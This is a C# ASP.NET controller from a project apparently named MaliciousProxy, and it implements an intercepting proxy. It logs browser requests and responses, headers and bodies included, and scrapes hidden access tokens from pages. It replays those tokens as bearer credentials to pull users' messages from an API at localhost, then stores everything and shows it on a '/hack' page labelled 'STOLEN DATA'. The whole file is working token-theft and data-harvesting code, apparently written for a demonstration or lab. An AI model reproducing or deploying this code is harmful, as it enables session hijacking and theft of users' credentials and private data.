using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Web;

namespace MaliciousProxy.Controllers;
[ApiController]
public class HackController : ControllerBase
{
    public static readonly List<CapturedItem> CapturedData = new();

    static HackController()
    {
        if (System.IO.File.Exists("captured.json"))
        {
            try
            {
                var json = System.IO.File.ReadAllText("captured.json");
                var saved = JsonSerializer.Deserialize<CapturedDataStorage>(json);
                if (saved != null)
                {
                    var all = saved.CapturedData.Cast<CapturedItem>()
                        .Concat(saved.CapturedRequest)
                        .Concat(saved.CapturedResponse)
                        .Concat(saved.CapturedToken)
                        .OrderByDescending(c => c.Timestamp)
                        .ToList();
                    CapturedData.AddRange(all);
                }
            }
            catch (Exception ex)
            {
            }
        }
    }

    private readonly ILogger<HackController> _logger;

    public HackController(ILogger<HackController> logger)
    {
        _logger = logger;
    }

    [HttpGet("hack")]
    public async Task Get()
    {
        var recentData = CapturedData.Take(100).ToList();
        Response.ContentType = "text/html";
        await Response.WriteAsync("<h1>Recent Data</h1>");
        await Response.WriteAsync("<a href='/hack/clear'>Clear</a>");
        foreach (var capturedDataItem in recentData)
        {
            if (capturedDataItem is CapturedRequest request)
            {
                await Response.WriteAsync($"<h3>{request.Method} {request.Path}</h3>");
                await Response.WriteAsync("<pre>");
                foreach (var line in request.Headers)
                {
                    if (line == null)
                        continue;

                    await Response.WriteAsync($"{HttpUtility.HtmlEncode(line)}");
                    await Response.WriteAsync("\n");
                }

                await Response.WriteAsync("</pre>");
                if (request.Body != null)
                {
                    await Response.WriteAsync($"<h4>Body</h4>");
                    await Response.WriteAsync("<pre>");
                    await Response.WriteAsync(HttpUtility.HtmlEncode(request.Body));
                    await Response.WriteAsync("</pre>");
                }
            }
            else if (capturedDataItem is CapturedResponse response)
            {
                await Response.WriteAsync($"<h3>RESPONSE {response.Path}</h3>");
                await Response.WriteAsync("<pre>");
                foreach (var line in response.Headers)
                {
                    if (line == null)
                        continue;

                    await Response.WriteAsync($"{HttpUtility.HtmlEncode(line)}");
                    await Response.WriteAsync("\n");
                }

                await Response.WriteAsync("</pre>");
                if (response.Body != null)
                {
                    await Response.WriteAsync($"<h4>Body</h4>");
                    await Response.WriteAsync("<pre>");
                    await Response.WriteAsync(HttpUtility.HtmlEncode(response.Body));
                    await Response.WriteAsync("</pre>");
                }
            }
            else if (capturedDataItem is CapturedToken token)
            {
                await Response.WriteAsync($"<h3>TOKEN {token.TokenType}</h3>");
                await Response.WriteAsync("<pre>");
                await Response.WriteAsync(HttpUtility.HtmlEncode(token.Content));
                await Response.WriteAsync("</pre>");
            }
            else if (capturedDataItem is CapturedData data)
            {
                await Response.WriteAsync($"<h3>STOLEN DATA {data.Path}</h3>");
                await Response.WriteAsync("<pre>");
                await Response.WriteAsync(HttpUtility.HtmlEncode(data.Content ?? "N/A"));
                await Response.WriteAsync("</pre>");
            }
            else
            {
                await Response.WriteAsync($"<h2>{capturedDataItem.Path}</h2>");
            }
        }
    }

    [HttpGet("hack/clear")]
    public async Task<IActionResult> Clear()
    {
        CapturedData.Clear();
        System.IO.File.Delete("captured.json");
        return Redirect("/hack");
    }

    public static async Task AddRequest(HttpRequest request)
    {
        string body = Encoding.UTF8.GetString((await request.BodyReader.ReadAsync()).Buffer);

        request.Body = new MemoryStream(Encoding.UTF8.GetBytes(body));

        string? userAgent = request.Headers["User-Agent"].FirstOrDefault();
        if (userAgent?.Contains("Mozilla") != true)
            return;

        var requestCapture = new CapturedRequest(request.Method, request.Path)
        {
            Headers = request.Headers.Select(h => $"{h.Key}={string.Join(",", h.Value.ToArray())}").ToList(),
            Body = body
        };

        AddNew(requestCapture);
    }

    public static async Task AddResponse(HttpResponseMessage? response)
    {
        var path = response?.RequestMessage?.RequestUri?.PathAndQuery;
        if (path == null)
        {
            return;
        }

        string? userAgent = response!.RequestMessage?.Headers.UserAgent?.ToString();
        if (userAgent?.Contains("Mozilla") != true)
            return;

        string body = await response.Content.ReadAsStringAsync();
        response.Content = new StringContent(body);

        AddNew(new CapturedResponse(path, response.StatusCode)
        {
            Headers = response.Headers.Select(h => $"{h.Key}={string.Join(",", h.Value.ToArray())}").ToList(),
            Body = body
        });

        ExtractTokens(body);
    }

    private static void ExtractTokens(string body)
    {
        var match = Regex.Match(body, @"<input type='hidden' name='access_token' value='([^']*)' />");

        if (match.Success)
        {
            var accessToken = match.Groups[1].Value;
            AddNew(new CapturedToken("access_token", accessToken));

            GatherApiData(accessToken);
        }
    }

    private static async void GatherApiData(string accessToken)
    {
        var client = new HttpClient
        {
            BaseAddress = new Uri("https://localhost:7274")
        };
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);

        await TryDataFetch(client, "/api/messages");
        for (int i = 1; i <= 5; i++)
        {
            await TryDataFetch(client, $"/api/messages/{i}/from");
        }
        for (int i = 1; i <= 5; i++)
        {
            await TryDataFetch(client, $"/api/messages/{i}/to");
        }
    }

    private static async Task TryDataFetch(HttpClient client, string path)
    {
        try
        {
            var response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                var body = await response.Content.ReadAsStringAsync();
                AddNew(new CapturedData(path)
                {
                    Content = body
                });
            }
            else if (response.StatusCode is HttpStatusCode.Unauthorized or HttpStatusCode.Forbidden)
            {
                AddNew(new CapturedData(path)
                {
                    Content = $"Denied Access: {response.StatusCode}"
                });
            }
        }
        catch (Exception ex)
        {
        }
    }

    private static void AddNew(CapturedItem capturedItem)
    {
        CapturedData.Insert(0, capturedItem);

        while (CapturedData.Count > 1000)
        {
            CapturedData.RemoveAt(CapturedData.Count - 1);
        }

        var toStore = new CapturedDataStorage
        {
            CapturedData = CapturedData.OfType<CapturedData>().ToList(),
            CapturedRequest = CapturedData.OfType<CapturedRequest>().ToList(),
            CapturedResponse = CapturedData.OfType<CapturedResponse>().ToList(),
            CapturedToken = CapturedData.OfType<CapturedToken>().ToList()
        };
        var json = JsonSerializer.Serialize(toStore, new JsonSerializerOptions
        {
            WriteIndented = true,
            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
        });
        System.IO.File.WriteAllText("captured.json", json);
    }
}

public record CapturedItem(string Path, bool IsResponse)
{
    public DateTime Timestamp { get; init; } = DateTime.UtcNow;
}
public record CapturedRequest(string Method, string Path) : CapturedItem(Path, false)
{
    public string? Body { get; set; } = string.Empty;
    public List<string> Headers { get; set; } = new();
}
public record CapturedResponse(string Path, HttpStatusCode StatusCode) : CapturedItem(Path, true)
{
    public string? Body { get; set; } = string.Empty;
    public List<string> Headers { get; set; } = new();
}

public record CapturedToken(string TokenType, string Content) : CapturedItem(TokenType, true);

public record CapturedData(string Path) : CapturedItem(Path, true)
{
    public string? Content { get; set; } = string.Empty;
}

public class CapturedDataStorage
{
    public List<CapturedData> CapturedData { get; set; } = new();
    public List<CapturedToken> CapturedToken { get; set; } = new();
    public List<CapturedResponse> CapturedResponse { get; set; } = new();
    public List<CapturedRequest> CapturedRequest { get; set; } = new();
}